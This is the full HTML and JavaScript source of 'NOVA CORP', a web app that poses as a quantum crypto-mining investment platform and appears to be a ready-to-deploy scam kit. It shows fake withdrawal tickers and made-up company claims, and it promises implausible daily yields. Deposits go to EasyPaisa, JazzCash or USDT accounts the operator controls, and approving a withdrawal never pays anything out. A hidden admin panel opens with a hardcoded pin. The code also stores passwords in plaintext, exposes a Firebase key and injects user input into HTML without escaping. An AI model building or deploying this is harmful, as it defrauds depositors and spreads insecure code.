<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Worldwide Quantum Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #F8FAFC; --card: #FFFFFF; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; }
        .premium-card { background: var(--card); border: 1px solid #e2e8f0; border-radius: 28px; transition: 0.3s; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 16px; font-weight: 800; transition: 0.3s; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); text-align: center; cursor: pointer; }
        .screen { display: none; }
        .active-screen { display: block; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(20px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 18px 10px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .nav-item.active { color: var(--gold); }
        .ticker-wrap { background: #0f172a; color: white; padding: 10px 0; overflow: hidden; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 50s linear infinite; font-size: 9px; font-weight: 800; letter-spacing: 1px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .admin-btn { position: absolute; top: 0; left: 0; width: 60px; height: 60px; opacity: 0; z-index: 9999; }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker uppercase">⚡ NOVA CORP GLOBAL: New Mining Farm in Singapore Operational • BTC Mining Difficulty Adjusted • User @Z***8 Withdrew 150 USDT • 💎 Earn Daily Passive Income with Quantum Nodes</div>
    </div>

    <div onclick="adminClick()" class="admin-btn"></div>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white min-h-screen flex flex-col justify-center">
            <h1 class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[10px] mt-2 mb-10">Institutional Mining</p>
            
            <div class="bg-slate-50 p-6 rounded-3xl mb-8 text-left border border-slate-100">
                <h3 class="text-xs font-black uppercase mb-2">Company Details</h3>
                <p class="text-[10px] text-slate-500 leading-relaxed">Nova Corp is a globally registered quantum mining firm specializing in SHA-256 and Ethash algorithms. We provide secure, decentralized mining hardware for users worldwide to earn consistent daily yields.</p>
            </div>

            <div class="space-y-4 max-w-sm mx-auto w-full">
                <input type="text" id="u-id" placeholder="Access ID" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
                <input type="password" id="u-pw" placeholder="Security Key" class="w-full p-5 border-2 border-slate-100 rounded-3xl outline-none focus:border-[#D4AF37]">
                <button onclick="handleAuth()" class="w-full btn-gold py-5 uppercase tracking-widest text-sm">Initialize Session</button>
                <p onclick="toggleMode()" id="mode-text" class="text-[10px] text-slate-400 font-black uppercase mt-6 cursor-pointer underline">Create Account</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center bg-white border-b border-slate-100 sticky top-0 z-[100]">
            <h2 id="logo-main" class="font-black text-3xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <div class="flex flex-col items-end">
                    <span id="user-tag" class="text-[10px] font-black text-slate-900 uppercase">@USER</span>
                    <span class="text-[8px] font-bold text-green-500 uppercase">Level 1 Miner</span>
                </div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-5 pt-8 pb-32">
            <div class="bg-slate-900 rounded-[40px] p-10 mb-8 text-white shadow-2xl">
                <p class="text-[10px] text-slate-400 font-black uppercase tracking-[5px] mb-2">Available Balance</p>
                <h1 id="b-main" class="text-6xl font-black tracking-tighter mb-10">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-8">
                    <div><p class="text-[8px] text-slate-500 uppercase font-bold">Daily Earnings</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-slate-500 uppercase font-bold">Total Profits</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-wallet text-[#D4AF37]"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-money-bill-transfer text-slate-400"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-5 pt-8 pb-32">
            <h2 class="text-2xl font-black mb-8 text-center uppercase">Mining <span class="text-[#D4AF37]">Rigs</span></h2>
            <div id="nodes-grid" class="grid grid-cols-1 gap-6"></div>
        </div>

        <div id="page-logs" class="screen px-5 pt-8 pb-32">
            <h2 class="text-2xl font-black mb-8 uppercase text-center">Transaction <span class="text-[#D4AF37]">History</span></h2>
            <div id="logs-list" class="space-y-4"></div>
        </div>

        <div id="page-admin" class="screen px-5 pt-8 pb-32">
            <h2 class="text-2xl font-black mb-6 uppercase text-red-600">Admin Control</h2>
            <div class="grid grid-cols-1 gap-4 mb-8">
                <div class="premium-card p-6 bg-slate-900 text-white">
                    <h3 class="text-xs font-black mb-4">SYSTEM SETTINGS</h3>
                    <input type="text" id="set-easypaisa" placeholder="EasyPaisa Account No" class="w-full p-3 bg-slate-800 rounded-xl mb-2 text-sm border-0 outline-none">
                    <input type="text" id="set-jazzcash" placeholder="JazzCash Account No" class="w-full p-3 bg-slate-800 rounded-xl mb-2 text-sm border-0 outline-none">
                    <input type="text" id="set-usdt" placeholder="USDT TRC20 Address" class="w-full p-3 bg-slate-800 rounded-xl mb-4 text-sm border-0 outline-none">
                    <button onclick="updateSystemSettings()" class="w-full btn-gold py-3 text-xs">Save Settings</button>
                </div>
            </div>
            <h3 class="text-xs font-black mb-4">PENDING APPROVALS</h3>
            <div id="admin-pending-list" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-home text-xl"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-list-ul text-xl"></i><span>LOGS</span></div>
            <div id="nav-admin-btn" onclick="nav('page-admin', this)" class="nav-item hidden text-red-500"><i class="fa-solid fa-screwdriver-wrench text-xl"></i><span>ADMIN</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-xl text-red-400"></i><span>LOGOUT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">DEPOSIT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="grid grid-cols-2 gap-2 mb-8">
            <button onclick="selDep('EP')" class="p-4 border-2 rounded-2xl text-[10px] font-black uppercase">EasyPaisa</button>
            <button onclick="selDep('JC')" class="p-4 border-2 rounded-2xl text-[10px] font-black uppercase">JazzCash</button>
            <button onclick="selDep('USDT')" class="p-4 border-2 rounded-2xl text-[10px] font-black uppercase">USDT (TRC20)</button>
        </div>
        <div id="dep-details" class="bg-slate-50 p-6 rounded-3xl mb-8 hidden">
            <p id="dep-method-name" class="text-[9px] font-black text-slate-400 uppercase mb-1"></p>
            <p id="dep-address" class="text-lg font-black text-slate-900 break-all"></p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount" class="w-full p-5 border-2 border-slate-100 rounded-3xl mb-4 outline-none">
        <input type="text" id="dep-txid" placeholder="Transaction ID / Hash" class="w-full p-5 border-2 border-slate-100 rounded-3xl mb-8 outline-none">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-5 uppercase text-sm">Submit Deposit</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-2xl"></i></div>
        <select id="wd-method" class="w-full p-5 border-2 border-slate-100 rounded-3xl mb-4 outline-none text-sm font-bold">
            <option value="EasyPaisa">EasyPaisa</option>
            <option value="JazzCash">JazzCash</option>
            <option value="Bank Transfer">Bank Transfer</option>
            <option value="USDT TRC20">USDT TRC20</option>
        </select>
        <input type="number" id="wd-amt" placeholder="Amount" class="w-full p-5 border-2 border-slate-100 rounded-3xl mb-4 outline-none">
        <input type="text" id="wd-acc" placeholder="Account Number / Wallet" class="w-full p-5 border-2 border-slate-100 rounded-3xl mb-8 outline-none">
        <button onclick="submitFin('Withdraw')" class="w-full btn-gold py-5 uppercase text-sm">Request Payout</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);

        let currentUser = localStorage.getItem('nova_session');
        let isLoginMode = true;
        let adminClicks = 0;
        let sysSettings = { EP: "03221234567", JC: "03001234567", USDT: "0xDefaultAddress" };

        const nodesData = [
            { id: 1, name: "Starter Core", cost: 10, yield: 0.8, color: "#94a3b8" },
            { id: 2, name: "Neon Alpha", cost: 20, yield: 1.8, color: "#10b981" },
            { id: 3, name: "Bronze Rig", cost: 50, yield: 4.8, color: "#d97706" },
            { id: 4, name: "Silver Plus", cost: 100, yield: 10.5, color: "#94a3b8" },
            { id: 5, name: "Gold Ultra", cost: 250, yield: 28.0, color: "#f59e0b" },
            { id: 6, name: "Platinum X", cost: 500, yield: 62.0, color: "#3b82f6" },
            { id: 7, name: "Quantum 1", cost: 1000, yield: 135.0, color: "#8b5cf6" },
            { id: 8, name: "Deep Mine", cost: 2000, yield: 280.0, color: "#ec4899" },
            { id: 9, name: "Infinite Rig", cost: 5000, yield: 750.0, color: "#ef4444" }
        ];
        // Generate up to 21 nodes dynamically
        for(let i=10; i<=21; i++){
            nodesData.push({ id: i, name: `Master Node V${i}`, cost: 5000 + (i*500), yield: 800 + (i*100), color: "#000" });
        }

        window.adminClick = () => {
            adminClicks++;
            if(adminClicks >= 5) {
                const pin = prompt("Enter Secret Pin:");
                if(pin === "nov786") {
                    document.getElementById('nav-admin-btn').classList.remove('hidden');
                    alert("Admin Mode Unlocked!");
                }
                adminClicks = 0;
            }
        };

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Required");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(isLoginMode) {
                if(snap.exists() && snap.data().password === pw) { 
                    if(snap.data().status === 'Banned') return alert("Account Banned!");
                    localStorage.setItem('nova_session', id); location.reload(); 
                }
                else alert("Failed");
            } else {
                if(snap.exists()) return alert("Exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [], status: 'Active' });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        async function processAutoProfits(uid, userData) {
            const nodes = userData.active_nodes || []; if(nodes.length === 0) return;
            let earned = 0; const now = Date.now();
            const updated = nodes.map(n => {
                const diff = now - n.lastClaim;
                if(diff >= 86400000) {
                    const days = Math.floor(diff / 86400000);
                    earned += (n.yield * days);
                    return { ...n, lastClaim: now };
                }
                return n;
            });
            if(earned > 0) {
                await updateDoc(doc(db, "users", uid), { 
                    balance: (userData.balance || 0) + earned,
                    total_profit: (userData.total_profit || 0) + earned,
                    active_nodes: updated
                });
            }
        }

        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data(); if(!data) return;
                processAutoProfits(id, data);
                document.getElementById('user-tag').innerText = `@${id}`;
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                renderNodes(data.active_nodes || []);
            });
            onSnapshot(doc(db, "config", "settings"), d => { if(d.exists()) sysSettings = d.data(); });
            loadLogs(id); loadAdminList(); setupChart();
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodesData.forEach(node => {
                const isActive = active.find(a => a.nodeId === node.id);
                grid.innerHTML += `<div class="premium-card p-6 border-l-8" style="border-left-color: ${node.color}">
                    <div class="flex justify-between items-center mb-4">
                        <h4 class="font-black uppercase">${node.name}</h4>
                        <span class="text-green-500 font-black">$${node.yield}/D</span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-xs font-bold text-slate-400">$${node.cost} Activation</span>
                        ${isActive ? `<span class="text-[10px] font-black text-blue-500">RUNNING...</span>` : 
                        `<button onclick="buyNode(${node.id}, ${node.cost}, ${node.yield})" class="px-6 py-2 btn-gold text-[10px]">ACTIVATE</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uid = localStorage.getItem('nova_session'); const uRef = doc(db, "users", uid);
            const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Low Balance");
            await updateDoc(uRef, { 
                balance: snap.data().balance - cost, 
                active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y, lastClaim: Date.now() }],
                daily: (snap.data().daily || 0) + y
            });
            alert("Node Activated!");
        };

        window.selDep = (type) => {
            document.getElementById('dep-details').classList.remove('hidden');
            document.getElementById('dep-method-name').innerText = type === 'EP' ? 'EasyPaisa' : type === 'JC' ? 'JazzCash' : 'USDT TRC20';
            document.getElementById('dep-address').innerText = sysSettings[type] || "Contact Admin";
        };

        window.submitFin = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const ref = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-acc').value;
            if(!amt || !ref) return alert("Empty fields");
            await addDoc(collection(db, "logs"), { user: currentUser, type, amount: amt, ref, status: 'Pending', time: Date.now() });
            alert("Submitted!"); closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
        };

        async function loadAdminList() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const div = document.getElementById('admin-pending-list'); div.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    div.innerHTML += `<div class="premium-card p-4 text-xs">
                        <p><b>User:</b> ${l.user} | <b>${l.type}:</b> $${l.amount}</p>
                        <p class="text-slate-400 mb-4">Ref: ${l.ref}</p>
                        <div class="flex gap-2">
                            <button onclick="approveLog('${d.id}', '${l.user}', ${l.amount}, '${l.type}')" class="bg-green-500 text-white px-4 py-2 rounded-lg font-bold">APPROVE</button>
                            <button onclick="rejectLog('${d.id}')" class="bg-red-500 text-white px-4 py-2 rounded-lg font-bold">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approveLog = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const uSnap = await getDoc(uRef);
            if(type === 'Deposit') {
                await updateDoc(uRef, { balance: (uSnap.data().balance || 0) + amt });
            }
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
            alert("Action Successful");
        };

        window.updateSystemSettings = async () => {
            const settings = {
                EP: document.getElementById('set-easypaisa').value,
                JC: document.getElementById('set-jazzcash').value,
                USDT: document.getElementById('set-usdt').value
            };
            await setDoc(doc(db, "config", "settings"), settings);
            alert("System Updated!");
        };

        function loadLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const list = document.getElementById('logs-list'); list.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    list.innerHTML += `<div class="premium-card p-5 flex justify-between"><div><p class="text-[10px] font-black uppercase">${l.type}</p><p class="text-lg font-black">$${l.amount.toFixed(2)}</p></div><span class="text-[9px] font-black uppercase ${l.status === 'Pending' ? 'text-orange-500' : 'text-green-500'}">${l.status}</span></div>`;
                });
            });
        }

        function setupChart() {
            const ctx = document.getElementById('profitChart'); if(!ctx) return;
            new Chart(ctx, { type: 'line', data: { labels: ['M','T','W','T','F','S','S'], datasets: [{ data: [10, 25, 45, 30, 60, 80, 95], borderColor: '#D4AF37', fill: true, backgroundColor: 'rgba(212,175,55,0.1)', tension: 0.4 }] }, options: { plugins:{legend:{display:false}}, scales:{x:{display:false},y:{display:false}} } });
        }

        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleMode = () => { isLoginMode = !isLoginMode; document.getElementById('mode-text').innerText = isLoginMode ? "Create Account" : "Access Portal"; document.querySelector('.btn-gold').innerText = isLoginMode ? "Initialize Session" : "Create Master Account"; };

        if(currentUser) initApp(currentUser);
    </script>
</body>
</html>
